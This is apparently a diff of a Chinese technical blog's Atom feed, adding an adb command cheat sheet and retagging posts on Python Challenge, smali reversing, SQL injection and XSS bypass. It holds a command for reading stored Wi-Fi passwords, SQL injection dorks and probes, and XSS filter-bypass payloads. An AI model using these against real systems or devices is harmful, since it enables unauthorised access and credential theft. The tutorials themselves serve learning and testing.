@@ -73,6 +73,206 @@
   </entry>
   
   <entry>
+    <title><![CDATA[adb shell常用命令]]></title>
+    <link href="http://blog.idhyt.xyz/2015/10/31/4-android-adb-shell-command/"/>
+    <id>http://blog.idhyt.xyz/2015/10/31/4-android-adb-shell-command/</id>
+    <published>2015-10-31T03:45:11.000Z</published>
+    <updated>2015-12-27T09:44:18.000Z</updated>
+    <content type="html"><![CDATA[<ul>
+<li><p>获取序列号：<br><code>adb get-serialno</code></p>
+</li>
+<li><p>查看连接计算机的设备：<br><code>adb devices</code></p>
+</li>
+<li><p>查看模拟器/设施的当前状态:<br><code>adb get-state</code></p>
+</li>
+<li><p>多设备下连接目标设备：<br><code>adb -s xxx shell</code></p>
+</li>
+<li><p>重启机器：<br><code>adb reboot</code></p>
+</li>
+<li><p>重启到bootloader，即刷机模式：<br><code>adb reboot bootloader</code></p>
+</li>
+<li><p>重启到recovery，即恢复模式：<br><code>adb reboot recovery</code></p>
+</li>
+<li><p>查看log：<br><code>adb logcat</code></p>
+</li>
+<li><p>终止adb服务进程：<br><code>adb kill-server</code></p>
+</li>
+<li><p>重启adb服务进程：<br><code>adb start-server</code></p>
+</li>
+<li><p>查看Service列表<br><code>adb shell service list</code><br><code>adb shell dumpsys activity services</code></p>
+</li>
+</ul>
+<ul>
+<li>检查Service是否存在<br><code>adb shell service check phone</code></li>
+</ul>
+<ul>
+<li><p>获取机器MAC地址：<br><code>adb shell  cat /sys/class/net/wlan0/address</code></p>
+</li>
+<li><p>获取CPU序列号：<br><code>adb shell cat /proc/cpuinfo</code></p>
+</li>
+<li><p>安装APK：<br><code>adb install &lt;apkfile&gt; //比如：adb install baidu.apk</code></p>
+</li>
+<li><p>保留数据和缓存文件，重新安装apk：<br><code>adb install -r &lt;apkfile&gt; //比如：adb install -r baidu.apk</code></p>
+</li>
+<li><p>安装apk到sd卡：<br><code>adb install -s &lt;apkfile&gt; // 比如：adb install -s baidu.apk</code></p>
+</li>
+<li><p>卸载APK：<br><code>adb uninstall &lt;package&gt; //比如：adb uninstall com.baidu.search</code></p>
+</li>
+<li><p>卸载app但保留数据和缓存文件：<br><code>adb uninstall -k &lt;package&gt; //比如：adb uninstall -k com.baidu.search</code></p>
+</li>
+<li><p>启动应用：<br><code>adb shell am start -n &lt;package_name&gt;/.&lt;activity_class_name&gt;</code></p>
+</li>
+<li><p>查看数据库：<br><code>adb shell content query --uri  content://settings/secure</code></p>
+</li>
+<li><p>查看设备cpu和内存占用情况：<br><code>adb shell top</code></p>
+</li>
+<li><p>查看占用内存前6的app：<br><code>adb shell top -m 6</code></p>
+</li>
+<li><p>刷新一次内存信息，然后返回：<br><code>adb shell top -n 1</code></p>
+</li>
+<li><p>查询各进程内存使用情况：<br><code>adb shell procrank</code></p>
+</li>
+<li><p>启动应用程序:<br><code>adb shell am</code></p>
+</li>
+<li><p>杀死一个进程：<br><code>adb shell kill [pid]</code></p>
+</li>
+<li><p>查看进程列表：<br><code>adb shell ps</code></p>
+</li>
+<li><p>查看Android系统的属性<br><code>adb shell prop</code></p>
+</li>
+<li><p>查看指定进程状态：<br><code>adb shell ps -x [PID]</code></p>
+</li>
+<li><p>查看后台services信息：<br><code>adb shell service list</code></p>
+</li>
+<li><p>adb 查看最上层成activity名字：</p>
+<blockquote>
+<p>linux:<br><code>adb shell dumpsys activity | grep &quot;mFocusedActivity&quot;</code><br>windows:<br><code>adb shell dumpsys activity | findstr &quot;mFocusedActivity&quot;</code></p>
+</blockquote>
+</li>
+<li><p>查看当前内存占用：<br><code>adb shell cat /proc/meminfo</code></p>
+</li>
+<li><p>查看IO内存分区：<br><code>adb shell cat /proc/iomem</code></p>
+</li>
+<li><p>将system分区重新挂载为可读写分区：<br><code>adb remount</code></p>
+</li>
+<li><p>从本地复制文件到设备：<br><code>adb push &lt;local&gt; &lt;remote&gt;</code></p>
+</li>
+<li><p>从设备复制文件到本地：<br><code>adb pull &lt;remote&gt; &lt;local&gt;</code></p>
+</li>
+<li><p>列出目录下的文件和文件夹，等同于dos中的dir命令：<br><code>adb shell ls</code></p>
+</li>
+<li><p>进入文件夹，等同于dos中的cd 命令：<br><code>adb shell cd &lt;folder&gt;</code></p>
+</li>
+<li><p>重命名文件：<br><code>adb shell rename path/oldfilename path/newfilename</code> </p>
+</li>
+<li><p>删除system/avi.apk：<br><code>adb shell rm /system/avi.apk</code></p>
+</li>
+<li><p>删除文件夹及其下面所有文件：<br><code>adb shell rm -r &lt;folder&gt;</code> </p>
+</li>
+<li><p>移动文件：<br><code>adb shell mv path/file newpath/file</code></p>
+</li>
+<li><p>设置文件权限：<br><code>adb shell chmod 777 /system/fonts/DroidSansFallback.ttf</code></p>
+</li>
+<li><p>新建文件夹：<br><code>adb shell mkdir path/foldelname</code></p>
+</li>
+<li><p>查看文件内容：<br><code>adb shell cat &lt;file&gt;</code> </p>
+</li>
+<li><p>查看wifi密码：<br><code>adb shell cat /data/misc/wifi/*.conf</code> </p>
+</li>
+<li><p>清除log缓存：<br><code>adb logcat -c</code></p>
+</li>
+<li><p>查看bug报告：<br><code>adb bugreport</code></p>
+</li>
+<li><p>获取设备名称：<br><code>adb shell cat /system/build.prop</code></p>
+</li>
+<li><p>查看ADB帮助：<br><code>adb help</code></p>
+</li>
+<li><p>跑monkey：<br><code>adb shell monkey -v -p your.package.name 500</code></p>
+</li>
+<li><p>dump堆栈：<br><code>debuggerd -b &lt;pid&gt;</code></p>
+</li>
+<li><p>备份与恢复:</p>
+<blockquote>
+<p>备份：<br><code>adb backup -f c:\allowBackup.ab -noapk com.ijinshan.browser_fast</code><br>恢复：<br><code>adb restore &quot;c:\allowBackup.ab&quot;</code></p>
+</blockquote>
+</li>
+<li><p>拷贝文件(这些命令都是在adb下用，而不是在shell中用):</p>
+<blockquote>
+<p>push从电脑端向手机复制文件:<br><code>adb push d:/adb/test.txt /data/data/download/</code><br>pull从手机端向本地复制文件:<br><code>adb pull /data/data/download/ d:/adb/</code></p>
+</blockquote>
+</li>
+<li><p>查看应用程序内存使用情况:<br><code>adb shell dumpsys meminfo &lt;package_name&gt;</code></p>
+<blockquote>
+<p>其中，package_name 也可以换成程序的pid,<br>pid可以通过 <code>adb shell top | grep app_name</code> 来查找.<br>内存使用情况参考<code>http://blog.csdn.net/bigconvience/article/details/35553983</code></p>
+</blockquote>
+</li>
+<li><p>查看进程占用cpu的情况:<br><code>adb shell top -n 1 -d 0.5 | grep proc_ id</code></p>
+</li>
+<li><p>procrank查看内存占用：<br><code>adb shell procrank</code></p>
+<blockquote>
+<p>VSS - Virtual Set Size 虚拟耗用内存（包含共享库占用的内存）<br>RSS - Resident Set Size 实际使用物理内存（包含共享库占用的内存）<br>PSS - Proportional Set Size 实际使用的物理内存（比例分配共享库占用的内存）<br>USS - Unique Set Size 进程独自占用的物理内存（不包含共享库占用的内存）</p>
+</blockquote>
+</li>
+</ul>
+<ul>
+<li><p>快速查看apk内androidmanifest文件内容:<br><code>aapt dump xmltree xxxx.apk AndroidManifest.xml</code></p>
+</li>
+<li><p>列出一些系统信息和所有应用的信息:<br><code>adb shell dumpsys packages &gt; d:\\packages.txt</code></p>
+</li>
+<li><p>列出一些指定应用的信息:<br><code>adb shell dumpsys package com.ijinshan.duba &gt; d:\\duba.txt</code></p>
+</li>
+<li><p>查看当前谁持有WAKE_LOCK锁对象：<br><code>adb shell dumpsys power</code></p>
+</li>
+<li><p>查看电池用量详情：<br><code>adb shell dumpsys batteryinfo</code></p>
+</li>
+<li><p>搜索文件：<br><code>busybox find -name *xxx*</code></p>
+</li>
+<li><p>电池日志：<br><code>adb shell dumpsys batterystats &gt; x:\batterystats.txt</code><br><code>bugreport日志：adb bugreport &gt; x:\bugreport.txt</code></p>
+</li>
+<li><p>电池日志图形界面查看<br><code>https://github.com/cacker/battery-historian</code></p>
+</li>
+<li><p>查看应用uid<br><code>cat /proc/&lt;pid&gt;/status</code><br><code>cat /data/system/packages.list | grep xxx</code></p>
+</li>
+<li><p>cpu频率<br>查看：<br><code>cat [%cpuFreqPath%]/cpuinfo_cur_freq (当前cpu频率)</code><br>修改：<br><code>echo xxx &gt; /sys/devices/system/cpu/cpu0/cpufreq/scaling_governor</code></p>
+<blockquote>
+<p>cat /sys/devices/system/cpu/cpu0/cpufreq/cpuinfo_cur_freq   (当前cpu频率)<br>  cat /sys/devices/system/cpu/cpu0/cpufreq/cpuinfo_max_freq  (最大cpu频率)<br>  cat /sys/devices/system/cpu/cpu0/cpufreq/cpuinfo_min_freq  (最小cpu频率)<br>  cat /sys/devices/system/cpu/cpu0/cpufreq/related_cpus  (cpu数量标号,从0开始,如果是双核,结果为0,1)<br>  cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_available_frequencies  (cpu所有可用频率)<br>  cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_available_governors  (cpu所有可用调控模式)<br>  cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_governor (当前使用哪种调控模式)<br>  cat /sys/devices/system/cpu/cpu0/cpufreq/cpuinfo_transition_latency (变频延迟)</p>
+</blockquote>
+</li>
+</ul>
+<ul>
+<li><p>某个应用内存消耗信息<br><code>adb shell dumpsys meminfo sina.mobile.tianqitong &gt; d:\\meminfo.txt</code></p>
+</li>
+<li><p>zygote的堆栈dump</p>
+<blockquote>
+<p>adb shell // 进入shell<br>chmod 777 /data/anr // /data/anr设置可读写权限<br>rm -r traces.txt // 删除原始traces<br>adb shell ps //查看进程pid<br>kill -3 <pid> //<br>adb pull /data/anr/traces.txt d:/trace.txt<br><strong>trace中查看cpu调度的基本信息</strong></pid></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">"Thread-196" prio=5 tid=27 SUSPENDED</span><br><span class="line">| sysTid=2271 nice=0 sched=0/0 cgrp=apps/bg_non_interactive handle=1543812984</span><br><span class="line">| state=S schedstat=( 1177036142201 119659820902 234955 ) utm=84431 stm=33272 core=0</span><br><span class="line">#00  pc 000217a8  /system/lib/libc.so (__futex_syscall3+8)</span><br><span class="line">#01  pc 0000e09c  /system/lib/libc.so (__pthread_cond_timedwait_relative+48)</span><br><span class="line">#02  pc 0000e0f8  /system/lib/libc.so (__pthread_cond_timedwait+60)</span><br><span class="line">#03  pc 0005419d  /system/lib/libdvm.so (dvmChangeStatus(Thread*, ThreadStatus)+72)</span><br><span class="line">#04  pc 00049995  /system/lib/libdvm.so</span><br><span class="line">#05  pc 0004b9c1  /system/lib/libdvm.so</span><br><span class="line">#06  pc 0006e721  /system/lib/libandroid_runtime.so</span><br><span class="line">#07  pc 0001e610  /system/lib/libdvm.so (dvmPlatformInvoke+112)</span><br><span class="line">#08  pc 0004df29  /system/lib/libdvm.so (dvmCallJNIMethod(unsigned int const*, JValue*, Method const*, Thread*)+500)</span><br><span class="line">#09  pc 00027a24  /system/lib/libdvm.so</span><br><span class="line">#10  pc 000fedc8  [stack:2271]</span><br><span class="line">at android.util.Log.println_native(Native Method)</span><br><span class="line">at android.util.Log.println(Log.java:332)</span><br><span class="line">at com.android.internal.os.AndroidPrintStream.log(AndroidPrintStream.java:47)</span><br><span class="line">at com.android.internal.os.LoggingPrintStream.println(LoggingPrintStream.java:311)</span><br><span class="line">at java.net.PlainSocketImpl.read(PlainSocketImpl.java:487)</span><br><span class="line">at java.net.PlainSocketImpl.access$000(PlainSocketImpl.java:46)</span><br><span class="line">at java.net.PlainSocketImpl$PlainSocketInputStream.read(PlainSocketImpl.java:240)</span><br><span class="line">at java.io.InputStream.read(InputStream.java:163)</span><br><span class="line">at java.io.BufferedInputStream.fillbuf(BufferedInputStream.java:142)</span><br><span class="line">at java.io.BufferedInputStream.read(BufferedInputStream.java:309)</span><br><span class="line">at com.sina.push.i.c.c(SourceFile:241)</span><br><span class="line">at com.sina.push.i.c.b(SourceFile:133)</span><br><span class="line">at com.sina.push.i.c.d(SourceFile:270)</span><br><span class="line">at com.sina.push.i.c.e(SourceFile:496)</span><br><span class="line">at com.sina.push.i.c.&lt;init&gt;(SourceFile:97)</span><br><span class="line">at com.sina.push.b.a.b.a(SourceFile:56)</span><br><span class="line">at com.sina.push.b.e.a(SourceFile:166)</span><br><span class="line">at com.sina.push.b.e$b$a.run(SourceFile:487)</span><br></pre></td></tr></table></figure>
+</blockquote>
+</li>
+</ul>
+<p>其中<code>schedstat=( 1177036142201 119659820902 234955 ) utm=84431 stm=33272 core=0</code><br>从左到右六个数字分别是:<br>1- 当前线程在cpu上消耗的时间<br>2- 当前任务在CPU任务轮询中的等待时间<br>3- 当前线程在这个cpu上运行的次数<br>4- 当前线程的用户态执行时间<br>5- 当前线程的内核态执行时间<br>6- 当前线程在哪里个核心上执行<br>实际上描述了调度的基本信息</p>
+<ul>
+<li>SYSTEM LOG<br><code>logcat -b system -v time -d *:v | grep sina.mobile</code><blockquote>
+<p>-b <buffer> // 加载一个可使用的日志缓冲区供查看，比如event和radio,默认值是main.<br>system // system log<br>-v // 输出字段 time 显示时间<br>-d // 缓冲区日志打印并退出<br>*:v // 日志级别高到低 E W I D V<br>grep sina.mobile // 过滤包含sina.mobile的信息</buffer></p>
+</blockquote>
+</li>
+</ul>
+]]></content>
+    <summary type="html">
+    <![CDATA[<ul>
+<li><p>获取序列号：<br><code>adb get-serialno</code></p>
+</li>
+<li><p>查看连接计算机的设备：<br><code>adb devices</code></p>
+</li>
+<li><p>查看模拟器/设施的当前状态:]]>
+    </summary>
+    
+      <category term="adb" scheme="http://blog.idhyt.xyz/tags/adb/"/>
+    
+      <category term="android" scheme="http://blog.idhyt.xyz/categories/android/"/>
+    
+  </entry>
+  
+  <entry>
     <title><![CDATA[安卓注入框架Xposed分析与简单应用]]></title>
     <link href="http://blog.idhyt.xyz/2015/09/25/4-android-injection-xposed/"/>
     <id>http://blog.idhyt.xyz/2015/09/25/4-android-injection-xposed/</id>
@@ -186,7 +386,7 @@
     <link href="http://blog.idhyt.xyz/2015/08/13/5-python-challenge-21-27/"/>
     <id>http://blog.idhyt.xyz/2015/08/13/5-python-challenge-21-27/</id>
     <published>2015-08-13T13:55:11.000Z</published>
-    <updated>2015-12-06T14:24:49.000Z</updated>
+    <updated>2015-12-27T08:54:21.000Z</updated>
     <content type="html"><![CDATA[<p>继续斗智斗勇中。已经开始谷歌大法好了。。</p>
 <h3 id="python_challenge_21"><a href="">python challenge 21</a></h3><p><code>invader.zip</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Yes! This is really level 21 in here. &#10;And yes, After you solve it, you&#39;ll be in level 22!&#10;&#10;Now for the level:&#10;&#10;* We used to play this game when we were kids&#10;* When I had no idea what to do, I looked backwards.</span><br></pre></td></tr></table></figure></p>
 <p>说这是个小时候的游戏，击鼓传花，国外的玩法不一样，需要一层层地拆传递的那个东西<br>level 20下载到的那个压缩包的package.pack文件是个压缩文件，使用了zlib和bz2两种方式压缩。<br>需要根据上一次解压得到的结果，判断下一次解压用zlib还是bz2，以及判断得到的数据是正向的还是要look backwards。<br>Zlib压缩的数据开头第一个字节是”\x78”,ASCII码是”x”.<br>BZ压缩的数据开头两个字节是”\x42\x7A”,ASCII码是”BZ”.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">def package():&#10;    import bz2&#10;    import zlib&#10;&#10;    data = open(&#34;files/invader/package.pack&#34;, &#34;rb+&#34;).read()&#10;    result = []&#10;    while True:&#10;        if data.startswith(&#34;x\x9c&#34;):&#10;            data = zlib.decompress(data)&#10;            result.append(&#34; &#34;)&#10;        elif data.startswith(&#34;BZ&#34;):&#10;            data = bz2.decompress(data)&#10;            result.append(&#34;#&#34;)&#10;        elif data.endswith(&#34;\x9cx&#34;):&#10;            data = data[::-1]&#10;            result.append(&#34;\n&#34;)&#10;        elif data.endswith(&#34;ZB&#34;):&#10;            data = data[::-1]&#10;            result.append(&#34;*&#34;)&#10;        else:&#10;            break&#10;&#10;    print &#34;&#34;.join(result)&#10;&#62;&#62;&#62;&#10;      ###          ###      ########    ########    ##########  ########&#10;    #######      #######    #########   #########   #########   #########&#10;   ##     ##    ##     ##   ##      ##  ##      ##  ##          ##      ##&#10;  ##           ##       ##  ##      ##  ##      ##  ##          ##      ##&#10;  ##           ##       ##  #########   #########   ########    #########&#10;  ##           ##       ##  ########    ########    ########    ######## &#10;  ##           ##       ##  ##          ##          ##          ##   ## &#10;   ##     ##    ##     ##   ##          ##          ##          ##    ## &#10;    #######      #######    ##          ##          #########   ##     ## &#10;      ###          ###      ##          ##          ##########  ##      ##</span><br></pre></td></tr></table></figure></p>
@@ -216,9 +416,9 @@
 <h3 id="python_challenge_21"><a href="">python challenge 21</a></h3><p><code>invader.zip</code><br><figure class]]>
     </summary>
     
-      <category term="python" scheme="http://blog.idhyt.xyz/tags/python/"/>
+      <category term="challenge" scheme="http://blog.idhyt.xyz/tags/challenge/"/>
     
-      <category term="技术" scheme="http://blog.idhyt.xyz/categories/%E6%8A%80%E6%9C%AF/"/>
+      <category term="python" scheme="http://blog.idhyt.xyz/categories/python/"/>
     
   </entry>
   
@@ -227,7 +427,7 @@
     <link href="http://blog.idhyt.xyz/2015/08/10/5-python-challenge-11-20/"/>
     <id>http://blog.idhyt.xyz/2015/08/10/5-python-challenge-11-20/</id>
     <published>2015-08-10T09:34:11.000Z</published>
-    <updated>2015-12-06T14:24:43.000Z</updated>
+    <updated>2015-12-27T08:54:38.000Z</updated>
     <content type="html"><![CDATA[<p>接上边继续斗智斗勇中。越来越觉得智商不够用了。。</p>
 <h3 id="python_challenge_11"><a href="http://www.pythonchallenge.com/pc/return/5808.html" target="_blank" rel="external">python challenge 11</a></h3><p><code>http://www.pythonchallenge.com/pc/return/5808.html</code><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-11.jpg" alt="11"><br>题目只有一张模糊的图片，源码也没什么提示，看页面title为odd even.<br>猜测这张模糊的图片是否是将两张图片合成的，因此将其奇偶坐标分离开.<br>分离坐标有四种情况，(odd, odd),(odd, even),(even, odd),(even, even).<br>我这里取双奇偶坐标(odd, odd)和(even, even).<br>在PIL库中，使用load函数的效果比使用putpixel和getpixel更高效，因此选择使用load函数.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">def odd_even():&#10;    from PIL import Image&#10;    im = Image.open(&#34;img/python-challenge-11.jpg&#34;)&#10;    w, h = im.size&#10;&#10;    imgs = [Image.new(im.mode, (w / 2, h / 2)) for i in xrange(2)]&#10;    imgs_load = [img.load() for img in imgs]&#10;    org = im.load()&#10;&#10;    for i in xrange(w):&#10;        for j in xrange(h):&#10;            if (i + j) % 2 == 0:&#10;                org_pos = (i, j)&#10;                new_pos = (i / 2, j / 2)&#10;                imgs_load[i % 2][new_pos] = org[org_pos]&#10;&#10;    [imgs[i].save(&#39;img/python-challenge-11-%d.jpg&#39; % i) for i in xrange(2)]</span><br></pre></td></tr></table></figure></p>
 <p>最后生成的两张图片是一样的<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-11-evil.jpg" alt="11-evil"><br>显示的单词evil即为答案。</p>
@@ -282,9 +482,9 @@
 <h3 id="python_challenge_11"><a href="http://www.pythonchallenge.com/pc/return/5808.html" target="_blank" re]]>
     </summary>
     
-      <category term="python" scheme="http://blog.idhyt.xyz/tags/python/"/>
+      <category term="challenge" scheme="http://blog.idhyt.xyz/tags/challenge/"/>
     
-      <category term="技术" scheme="http://blog.idhyt.xyz/categories/%E6%8A%80%E6%9C%AF/"/>
+      <category term="python" scheme="http://blog.idhyt.xyz/categories/python/"/>
     
   </entry>
   
@@ -293,7 +493,7 @@
     <link href="http://blog.idhyt.xyz/2015/08/07/5-python-challenge-0-10/"/>
     <id>http://blog.idhyt.xyz/2015/08/07/5-python-challenge-0-10/</id>
     <published>2015-08-07T08:06:11.000Z</published>
-    <updated>2015-12-06T14:24:34.000Z</updated>
+    <updated>2015-12-27T08:54:08.000Z</updated>
     <content type="html"><![CDATA[<p>最近闲下来了四处看资料，然后找到了这个python challenge网页闯关游戏。<br>这个游戏需要通过一些提示找出下一关的网页地址，链接：<a href="http://www.pythonchallenge.com/" target="_blank" rel="external">http://www.pythonchallenge.com/</a><br>题目出的也是充满想象力，斗智斗勇中。。。<br>解题代码整理在我的 <a href="https://github.com/idhyt/python_challenge" target="_blank" rel="external">github</a></p>
 <h3 id="python_challenge_0"><a href="http://www.pythonchallenge.com/pc/def/0.html" target="_blank" rel="external">python challenge 0</a></h3><p><code>http://www.pythonchallenge.com/pc/def/0.html</code><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-0.jpg" alt="0"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&#160;2&#30340;38&#27425;&#24130;&#10;def&#160;calc():&#10;&#160;&#160;&#160;&#160;return&#160;2&#160;**&#160;38&#10;&#62;&#62;&#62;&#160;274877906944L</span><br></pre></td></tr></table></figure>
@@ -367,9 +567,9 @@
     <![CDATA[<p>最近闲下来了四处看资料，然后找到了这个python challenge网页闯关游戏。<br>这个游戏需要通过一些提示找出下一关的网页地址，链接：<a href="http://www.pythonchallenge.com/" target="_blank" rel="ex]]>
     </summary>
     
-      <category term="python" scheme="http://blog.idhyt.xyz/tags/python/"/>
+      <category term="challenge" scheme="http://blog.idhyt.xyz/tags/challenge/"/>
     
-      <category term="技术" scheme="http://blog.idhyt.xyz/categories/%E6%8A%80%E6%9C%AF/"/>
+      <category term="python" scheme="http://blog.idhyt.xyz/categories/python/"/>
     
   </entry>
   
@@ -378,7 +578,7 @@
     <link href="http://blog.idhyt.xyz/2015/05/11/4-android-reverse-clickbutton/"/>
     <id>http://blog.idhyt.xyz/2015/05/11/4-android-reverse-clickbutton/</id>
     <published>2015-05-11T09:45:11.000Z</published>
-    <updated>2015-12-26T07:46:09.000Z</updated>
+    <updated>2015-12-27T08:55:44.000Z</updated>
     <content type="html"><![CDATA[<p>安卓逆向笔记,熟悉smali语法和函数调用<br>一个按钮程序,实现功能：点击 - 弹窗 - 退出</p>
 <h2 id="源码">源码</h2><p>主功能代码</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@Override&#10;protected void onCreate(Bundle savedInstanceState) &#123;&#10;    super.onCreate(savedInstanceState);&#10;    setContentView(R.layout.activity_click_button);&#10;    Button button = (Button)findViewById(R.id.click_me);&#10;    button.setOnClickListener(new View.OnClickListener() &#123;&#10;        @Override&#10;        public void onClick(View v) &#123;&#10;            AlertDialog.Builder alert = new AlertDialog.Builder(ClickButton.this);&#10;            alert.setTitle(&#34;hello world&#34;);&#10;            alert.setPositiveButton(&#34;exit&#34;, new DialogInterface.OnClickListener() &#123;&#10;                @Override&#10;                public void onClick(DialogInterface dialog, int which) &#123;&#10;                    dialog.dismiss();&#10;                    ClickButton.this.finish();&#10;                &#125;&#10;            &#125;);&#10;            alert.show();&#10;        &#125;&#10;    &#125;);&#10;&#125;</span><br></pre></td></tr></table></figure>
@@ -454,7 +654,7 @@ Lpackage/name/ObjectName;表示类型，MethodName是方法名。III为参数（
 <figure class="highlight plain"><table><tr><td clas]]>
     </summary>
     
-      <category term="android" scheme="http://blog.idhyt.xyz/tags/android/"/>
+      <category term="smali" scheme="http://blog.idhyt.xyz/tags/smali/"/>
     
       <category term="android" scheme="http://blog.idhyt.xyz/categories/android/"/>
     
@@ -465,7 +665,7 @@ Lpackage/name/ObjectName;表示类型，MethodName是方法名。III为参数（
     <link href="http://blog.idhyt.xyz/2015/05/08/4-android-netbeans-debug-smali/"/>
     <id>http://blog.idhyt.xyz/2015/05/08/4-android-netbeans-debug-smali/</id>
     <published>2015-05-08T13:11:11.000Z</published>
-    <updated>2015-12-26T07:45:59.000Z</updated>
+    <updated>2015-12-27T08:55:30.000Z</updated>
     <content type="html"><![CDATA[<p>通过修改apk包来实现动态调试smali文件。</p>
 <h2 id="调试工具">调试工具</h2><p><a href="https://netbeans.org/features/java/index.html" target="_blank" rel="external">Netbeans</a>java版本即可<br><a href="https://ibotpeaches.github.io/Apktool/" target="_blank" rel="external">apktool</a>解包打包<br><a href="https://code.google.com/p/signapk/downloads/list" target="_blank" rel="external">signapk</a>签名</p>
 <h2 id="生成可供调试的apk">生成可供调试的apk</h2><p>以app-release.apk说明</p>
@@ -505,7 +705,7 @@ java -jar <span class="string">"%~dp0signapk.jar"</span> <span class="string">"%
 <h2 id="调试工具">调试工具</h2><p><a href="https://netbeans.org/features/java/index.html" target="_blank" rel="extern]]>
     </summary>
     
-      <category term="android" scheme="http://blog.idhyt.xyz/tags/android/"/>
+      <category term="debug" scheme="http://blog.idhyt.xyz/tags/debug/"/>
     
       <category term="android" scheme="http://blog.idhyt.xyz/categories/android/"/>
     
@@ -516,7 +716,7 @@ java -jar <span class="string">"%~dp0signapk.jar"</span> <span class="string">"%
     <link href="http://blog.idhyt.xyz/2015/04/21/2-sql-inject/"/>
     <id>http://blog.idhyt.xyz/2015/04/21/2-sql-inject/</id>
     <published>2015-04-21T06:46:11.000Z</published>
-    <updated>2015-09-20T14:47:19.000Z</updated>
+    <updated>2015-12-27T08:56:25.000Z</updated>
     <content type="html"><![CDATA[<p>SQL注入测试思路整理<a id="more"></a></p>
 <h2 id="一-搜索可能有漏洞的网站">一.搜索可能有漏洞的网站</h2><p>利用google收集信息，可以搜索的关键词很多，网上有个术语，把这些称作“Google Dorks”</p>
 <pre><code><span class="string">inurl:</span>index.php?id=
@@ -618,7 +818,7 @@ and (select count(*)</span> <span class="keyword">from</span> msysobjects)&gt;<s
     
       <category term="inject" scheme="http://blog.idhyt.xyz/tags/inject/"/>
     
-      <category term="技术" scheme="http://blog.idhyt.xyz/categories/%E6%8A%80%E6%9C%AF/"/>
+      <category term="web" scheme="http://blog.idhyt.xyz/categories/web/"/>
     
   </entry>
   
@@ -672,7 +872,7 @@ and (select count(*)</span> <span class="keyword">from</span> msysobjects)&gt;<s
     
       <category term="webview" scheme="http://blog.idhyt.xyz/tags/webview/"/>
     
-      <category term="技术" scheme="http://blog.idhyt.xyz/categories/%E6%8A%80%E6%9C%AF/"/>
+      <category term="android" scheme="http://blog.idhyt.xyz/categories/android/"/>
     
   </entry>
   
@@ -862,7 +1062,7 @@ Are you sure you want to continue connecting (yes/no)?
     <link href="http://blog.idhyt.xyz/2014/10/15/2-xss-bypass/"/>
     <id>http://blog.idhyt.xyz/2014/10/15/2-xss-bypass/</id>
     <published>2014-10-15T03:56:24.000Z</published>
-    <updated>2015-09-20T14:47:19.000Z</updated>
+    <updated>2015-12-27T08:56:19.000Z</updated>
     <content type="html"><![CDATA[<p>xss绕过技巧整理<a id="more"></a></p>
 <h3 id="几种弹窗绕过">几种弹窗绕过</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">alert(<span class="number">1</span>) = <span class="built_in">Function</span>(alert(<span class="number">1</span>))()</span><br><span class="line">= <span class="built_in">Function</span>(<span class="built_in">String</span>.fromCharCode(<span class="number">97</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">40</span>,<span class="number">49</span>,<span class="number">41</span>))()</span><br><span class="line"><span class="number">97</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">40</span>,<span class="number">49</span>,<span class="number">41</span>对应alert(<span class="number">1</span>) ascii码的<span class="number">10</span>进制形式（Text2Dec）</span><br><span class="line"><span class="comment">//小写function</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    alert(<span class="number">1</span>)</span><br><span class="line">&#125;)()</span><br><span class="line"></span><br><span class="line">alert(<span class="number">1</span>) confirm(<span class="number">1</span>)  prompt(<span class="number">1</span>)</span><br><span class="line">&lt;SVG/onload=prompt(<span class="number">1</span>)&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="title">BODY</span> <span class="attribute">onload</span>=<span class="value">"alert('XSS')"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">img</span> <span class="attribute">src</span>=<span class="value">1</span> <span class="attribute">onerror</span>=<span class="value">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">img</span> <span class="attribute">src</span> <span class="attribute">onerror</span>=<span class="value">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">script</span> <span 